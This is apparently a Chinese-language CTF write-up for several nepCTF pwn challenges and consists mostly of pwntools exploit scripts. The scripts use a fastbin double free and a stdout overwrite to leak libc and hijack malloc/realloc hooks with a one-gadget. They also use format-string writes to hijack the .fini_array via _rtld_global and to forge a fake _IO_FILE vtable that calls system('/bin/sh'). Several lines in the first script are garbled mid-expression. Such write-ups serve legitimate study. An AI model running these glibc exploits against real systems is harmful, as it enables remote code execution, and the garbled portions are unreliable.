            def Add(sz, name, msg, nl=True):
                Cmd(1)
                if(nl):
                    sh.recvuntil('size of the your name: \n')
                else:
                    sh.recvuntil('size of the your name: ')
                sh.sendline(str(sz))
                if(nl):
                    sh.recvuntil('Your name:\n')
                else:
                    sh.recvuntil('Your name:')
                sh.send(name)
                res = ''
                if(nl):
                    res = sh.recvuntil('Your message:\n')
                else:
                    res = sh.recvuntil('Your message:')
                sh.send(msg)
                return res
            def Delete(idx, nl = True):
                Cmd(2)
                if(nl):
                    sh.recvuntil('mumber\'s index:\n')
                else:
                    sh.recvuntil('mumber\'s index:')
                sh.sendline(str(idx))
            Add(0x90, 'A'*0x90, 'A\n')    #0
            Add(0x68, 'B'*0x68, 'B\n')    #1
            Add(0x68, 'C'*0x68, 'C\n')    #2
            #get a UB chunk
            Delete(0)        #UB(A, 0xA0)
            #gdb.attach(sh)
            #partial overwrite UB'fd, get a 0x7F fake chunk near stdout
            hb = 0xc #int(input(), 16)        #0xC
            Add(0x68, p16(0x5DD|(hbFC near stdout
            #Fastbin double Free
            Delete(1)        #FB[0x70]->B
            Delete(2)        #FB[0x70]->C->B
            Delete(1)        #FB[0x70]->BC
            hb = 0xF #int(input(), 16)        #0xf
            #partial overwrite A's fd, Fastbin[0x70]->C->B->D->FC near stdout
            Add(0x68, p16(0x060|(hbB->D->FC near stdout
            Add(0x68, p16(0x060|(hbD->FC near stdout
            Add(0x68, p16(0x060|(hbFC near stdout
            #stdout attack
            exp = '\x00'*(3+8*6)
            exp+= p64(0xFBAD1800)    #flag
            exp+= p64(0)*3            #read
            exp+= p8(0x58)            #write_ptr
            res = Add(0x68, exp, 'E\n', False)
            #get addr
            libc.address = u64(res[1:9]) -0x3c56a3
            Log('libc.address')
            if(libc.address>=0x0000800000000000):    #check
                sh.close()
                continue
            ones = [0x45226, 0x4527a, 0xf0364, 0xf1207]
            OGG = libc.address + ones[2]
            Log('OGG')
            FC_hook = libc.address+0x3c4aed
            Log('FC_hook')
            #fastbin Double free
            Delete(1, False)        #FB[0x70]->B
            Delete(2, False)        #FB[0x70]->C->B
            Delete(1, False)        #FB[0x70]->BC
            #attack realloc_hook, malloc_hook
            Add(0x68, p64(FC_hook), 'B\n', False)    #FB[0x70]->C->B->FC_hook
            Add(0x68, p64(FC_hook), 'C\n', False)    #FB[0x70]->B->FC_hook
            Add(0x68, p64(FC_hook), 'B\n', False)    #FB[0x70]->FC_hook
            #Add(0x68, p64(FC_hook), 'B\n')    #FB[0x70]->C->B->FC_hook
            exp = '\x00'*(3)
            exp+= p64(0)
            exp+= p64(OGG)                            #realloc_hook
            exp+= p64(libc.symbols['realloc']+16)        #adjust stack env
            Add(0x68, exp, 'F\n', False)
            #trigger
            #gdb.attach(sh, 'break *'+hex(proc_base+0xb0a))    
            Cmd(1)
            sh.interactive()
        except:
            continue        
            #sh.close()
    '''
    telescope 0x202040+0x0000555555554000
    want:    0x0000555555759070
    '''
## nepCTF scmt
###  保护
###  程序分析
  * 直接格式化字符串泄露rand就好了,模板题
###  EXP
    #! /usr/bin/python
    # coding=utf-8
    import sys
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    sh = remote('node2.hackingfor.fun', 36380)
    #gdb.attach(sh, 'break *0x400B23')
    exp = '%8$x'
    sh.recvuntil('tell me your name:\n')
    sh.send(exp)
    sh.recvuntil('Welcome!!!')
    key = int(sh.recvuntil('Give', drop=True), 16)
    Log('key')
    sh.recvuntil('number:\n')
    sh.sendline(str(key))
    sh.interactive()
## nepCTF superpowers
###  保护
###  程序分析
**返回地址保护**
  * 在进入main函数的时候并不是常规的建立栈帧,而是借助ecx又保存了一次rsp
  * 这样做的目的是避免栈中的有指向返回地址的指针,让格式化字符串无法开启ROP
###  读文件
  * 读文件可以通过读/proc/self/maps来泄露所有地址 
    * self是一个伪目录,表示本进程的pid
    * maps保存了这个进程的内存映射
  * 远程打过去，得知为2.23的libc
###  格式化字符串
  * 长度无限制,读到栈上,可以直接拿来进行任意写
  * 再进行格式化字符串之后,程序调用了`fclose(fp)`就返回了
  * `main()`返回到`__libc_start_main()`之后,`__libc_start_main()`又会调用`exit()`
  * 因此这里有两个攻击面: 
    * `fclose(fp)`:伪造fp,通过vtable获得控制权
    * `exit()`:劫持`_rtdl_global`结构体,伪造.fini_arrary节进行一种另类的ROP 
      * 由于偏移问题,这种思路没成功,但还是很有借鉴意义的,所以说一下
### 劫持`_rtdl_global`
  * `ELF节标识符`通过`描述符+地址`指向节真正的位置 
    * 0x1a代表描述的是.fini_array节的地址
    * 0x1c代表描述的是.fini_array节的长度
  * `_rtdl_global`结构体位于ld.so.2的bss段,用来保存载入的ELF文件
  * `_rtdl_global`中通过指向`ELF节标识符`的指针来找到对应节
  * exit()函数再退出时,通过`_rtdl_global`找到`.fini_array节`,然后执行其中的函数
  * 通常ELF节标识符都是只读的,无法开刀,但是`_rtdl_global`可读可写
  * 所以我们可以通过libc地址+偏移找到`_rtdl_global`的地址
  * 格式化字符串修改`_rtdl_global`中的fini节指针,指向我们伪造的地方
  * 同时exit()调用`.fini_array节`中函数的特点 
    * 逆序从后往前调用
    * 遍历fini时只有几条指令,栈环境很稳定
    * 第一个参数正好是一个栈指针,可以用作缓冲器传递数据
###  EXP
    #! /usr/bin/python
    # coding=utf-8
    import sys
    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    if(len(sys.argv)==1):            #local
        sh = process('./pwn')
        proc_base = sh.libs()[sh.cwd + sh.argv[0].strip('.')]
        gdb.attach(sh, '''break *0x80487B3''')
    else:                            #remtoe
        sh = remote('node2.hackingfor.fun', 34111)
    def FileName(fn):
        sh.recvuntil('please input filename:')
        sh.sendline(fn)
    def Name(name):
        sh.recvuntil('what\'s you name?\n')
        sh.send(name)
    #leak addr
    FileName('/proc/self/maps')
    for i in range(5):
        sh.recvuntil('\n')
    libc.address = int(sh.recv(8), 16)
    Log('libc.address')
    #fmt str
    fini_arr_addr = libc.address + 0x1f59a0
    Log('fini_arr_addr')
    fini_arr_len_addr = libc.address + 0x1f59a8
    buf = 0x0804a400
    exp = fmtstr_payload(
            offset = 27,     
            writes = {
                fini_arr_len_addr: buf,
                fini_arr_addr: buf+8,
                #fini_arr_len section
                buf: 0x1C,
                buf+4: 4*3,
                #fini_arr section
                buf+8:  0x1a,
                buf+12:    buf+16,        #fini arr ptr
                buf+16:    libc.symbols['system'],
                buf+20: libc.symbols['gets'],
                buf+24: libc.symbols['gets']
            },
            write_size = 'byte'
        )
    Name(exp)
    sh.sendline('/bin/sh')
    sh.interactive()
    '''
    print:        break *0x80487B3
    exit:        break *0xf7fe8a53 / 0xf7e3677f /0xf7fe8a2f
    exit call:    0xf7fe8a70
    fini_arr:     set *0x8049edc=0xdeadbeef
    main_ret:     break *0x80487DC
    fini_arr_addr:     0x08049f10
    '''
### 伪造 _IO_FILE_
  * `fclsoe()`函数会根据虚表去调用`_IO_FINISH(fp)`
  * 2.23下并没有对`_IO_FILE`中`vtable`指针检查,所以可以随意伪造
  * 根据调用,我们只要把`_IO_FILE->vatble`劫持到伪造的虚表中
  * 然后在伪造的虚表中令`__finish`字段为`system()`
  * 此时`__finsh(fp)`就变成了`system(fp)`,我们只要再fp开头8B中写入”/bin/sh”就可getshell
###  EXP
    #! /usr/bin/python
    # coding=utf-8
    import sys
    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    if(len(sys.argv)==1):            #local
        sh = process('./pwn')
        proc_base = sh.libs()[sh.cwd + sh.argv[0].strip('.')]
        gdb.attach(sh, '''break *0x80487B3
    break *0x80487cd''')
    else:                            #remtoe
        sh = remote('node2.hackingfor.fun', 31049)
    def FileName(fn):
        sh.recvuntil('please input filename:')
        sh.sendline(fn)
    def Name(name):
        sh.recvuntil('what\'s you name?\n')
        sh.send(name)
    #leak addr
    FileName('/proc/self/maps')
    for i in range(5):
        sh.recvuntil('\n')
    libc.address = int(sh.recv(8), 16)
    Log('libc.address')
    #fmt str
    fp_addr = 0x0804a04c
    buf = elf.bss()+0x100
    system = libc.symbols['system']
    Log('system')
    exp = fmtstr_payload(
            offset = 27,     
            writes = {
                fp_addr: buf,
                #fake FILE struct
                buf:         u64('/bin/sh\x00')&(0xFFFFFFFF),
                buf+4:         u64('/bin/sh\x00')>>(32),
                buf+0x38:    -1,                                    #fd=-1 to pass by _IO_file_close_it
                buf+0x48:    libc.address+0x1b1870,                #pointer to zero
                buf+0x58:    libc.address+0x1b1870,                #pointer to zero
                buf+0x94:    buf+0xA0,                            #vtable ptr
                #fake vtable ptr
                buf+0xA8:    system
            },
            write_size = 'byte'
        )
    Name(exp)
    sh.interactive()
    '''
    print:        break *0x80487B3
    fclose()    break *0x80487cd
    '''